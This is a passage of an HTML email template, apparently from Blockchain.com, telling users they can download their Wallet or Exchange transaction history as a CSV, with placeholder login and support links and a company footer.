	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; padding: 0;" valign="top">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 34px; font-size: 0px; padding: 0; padding-top: 24px; padding-bottom: 20px; word-break: break-word;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 18px; line-height: 1; text-align: center; color: #000000;"><strong style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">Download Your Transaction History</strong></div>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; word-break: break-word;">&nbsp;</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 24px; font-weight: 500; font-size: 0px; padding: 0; padding-top: 28px; word-break: break-word;" align="left">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 16px; line-height: 1; text-align: left; color: #000000;">Hi there,</div>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 24px; font-weight: 500; font-size: 0px; padding: 0; padding-top: 20px; padding-bottom: 12px; word-break: break-word;" align="left">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 16px; line-height: 24px; text-align: left; color: #000000;">Whether for filing taxes or simply keeping your own records, you can now download your transaction history from Blockchain.com&rsquo;s Wallet or Exchange as a CSV. Simply log in and navigate to the Swap History page in the Wallet or the Order History page in the Exchange and select &lsquo;Download&rsquo; - we&rsquo;ll email you with a download link from there.</div>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; padding-top: 8px; padding-bottom: 4px; word-break: break-word;" align="center">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; mso-table-lspace: 0pt; mso-table-rspace: 0pt; border-collapse: separate; width: 200px; line-height: 100%;" role="presentation" border="0" width="200" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; border: none; border-radius: 4px; cursor: auto; height: 40px; mso-padding-alt: 0 40px; background: #096df2;" role="presentation" align="center" valign="middle" bgcolor="#096df2" height="40"><a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; display: inline-block; width: 120px; background: #096df2; color: #ffffff; font-family: Helvetica, Arial, sans-serif; font-size: 14px; font-weight: 600; line-height: 120%; margin: 0; text-decoration: none; text-transform: none; padding: 0 40px; mso-padding-alt: 0px; border-radius: 4px;" href="{}" target="_blank" rel="noopener">Log In</a></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 24px; font-weight: 500; font-size: 0px; padding: 0; padding-top: 16px; word-break: break-word;" align="left">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 16px; line-height: 1; text-align: left; color: #000000;">- Team Blockchain.com</div>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; background: #F4F6F7; background-color: #f4f6f7; margin: 0px auto; max-width: 600px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #F4F6F7; background-color: #f4f6f7; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#F4F6F7">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 12px 12px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; background: #ffffff; background-color: #ffffff; margin: 0px auto; border-radius: 12px; max-width: 576px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #ffffff; background-color: #ffffff; width: 100%; border-radius: 12px;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#ffffff">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 12px 20px 24px 20px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 100%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; padding: 0;" valign="top">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; padding-bottom: 12px; word-break: break-word;" align="center">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; mso-table-lspace: 0pt; mso-table-rspace: 0pt; border-collapse: collapse; border-spacing: 0px;" role="presentation" border="0" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 45px;" width="45"><img style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; line-height: 100%; -ms-interpolation-mode: bicubic; border: 0; display: block; outline: none; text-decoration: none; height: auto; width: 100%; font-size: 13px;" src="https://www.blockchain.com/static/img/email/chat_blue.png" alt="blockchain.com support logo" width="45" height="auto" /></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 500; font-size: 0px; padding: 0; word-break: break-word;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 14px; line-height: 1; text-align: center; color: #9f9f9f;">If you have any questions or feedback contact our Support team <a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none; font-size: 14px; font-weight: 500; color: #0c6cf2;" href="{}">here.</a></div>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; padding-top: 12px; padding-bottom: 8px; word-break: break-word;" align="center">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; mso-table-lspace: 0pt; mso-table-rspace: 0pt; border-collapse: collapse; border-spacing: 0px;" role="presentation" border="0" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 55px;" width="55"><img style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; line-height: 100%; -ms-interpolation-mode: bicubic; border: 0; display: block; outline: none; text-decoration: none; height: auto; width: 100%; font-size: 13px;" src="https://www.blockchain.com/static/img/email/check_blue.png" alt="blockchain.com checkmark logo" width="55" height="auto" /></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 500; font-size: 0px; padding: 0; word-break: break-word;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 14px; line-height: 1; text-align: center; color: #9f9f9f;">Check out all of our verified accounts <a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none; font-size: 14px; font-weight: 500; color: #0c6cf2;" href="{}">here.</a></div>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; margin: 0px auto; max-width: 600px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 0; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 100%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; padding: 0;" valign="top">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; word-break: break-word;">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; background: #F4F6F7; background-color: #f4f6f7; margin: 0px auto; max-width: 600px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #F4F6F7; background-color: #f4f6f7; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#F4F6F7">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 12px 12px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; margin: 0px auto; max-width: 576px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 12px 20px 12px 20px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0; line-height: 0; text-align: left; display: inline-block; width: 100%; direction: ltr;">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 50%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; padding: 0;" valign="top">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 18px; color: #9f9f9f; font-size: 0px; padding: 0; word-break: break-word;" align="left">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 12px; line-height: 1; text-align: left; color: #000000;">&copy; Blockchain.com</div>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 18px; color: #9f9f9f; font-size: 0px; padding: 0; word-break: break-word;" align="left">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 12px; line-height: 1; text-align: left; color: #000000;">GB LTD<br style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;" /> 86-90 Paul Street</div>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 18px; color: #9f9f9f; font-size: 0px; padding: 0; word-break: break-word;" align="left">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 12px; line-height: 1; text-align: left; color: #000000;">London<br style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;" /> EC2A 4NE</div>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 50%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; padding: 0;" valign="top">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; word-break: break-word;" align="right">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; float: none; display: inline-table;" role="presentation" border="0" cellspacing="0" cellpadding="0" align="right">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; padding: 0;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #e1e7ea; border-radius: 3px; width: 36px;" role="presentation" border="0" width="36" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0; height: 36px; vertical-align: middle; width: 36px;" valign="middle" width="36" height="36"><a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none;" href="{}" target="_blank" rel="noopener"><img style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; border-radius: 3px; display: block;" src="https://www.mailjet.com/images/theme/v1/icons/ico-social/facebook.png" alt="" width="36" height="36" /> </a></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; float: none; display: inline-table;" role="presentation" border="0" cellspacing="0" cellpadding="0" align="right">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; padding: 0;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #e1e7ea; border-radius: 3px; width: 36px;" role="presentation" border="0" width="36" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0; height: 36px; vertical-align: middle; width: 36px;" valign="middle" width="36" height="36"><a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none;" href="{}" target="_blank" rel="noopener"><img style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; border-radius: 3px; display: block;" src="https://www.mailjet.com/images/theme/v1/icons/ico-social/medium.png" alt="" width="36" height="36" /> </a></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; float: none; display: inline-table;" role="presentation" border="0" cellspacing="0" cellpadding="0" align="right">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; padding: 0;">
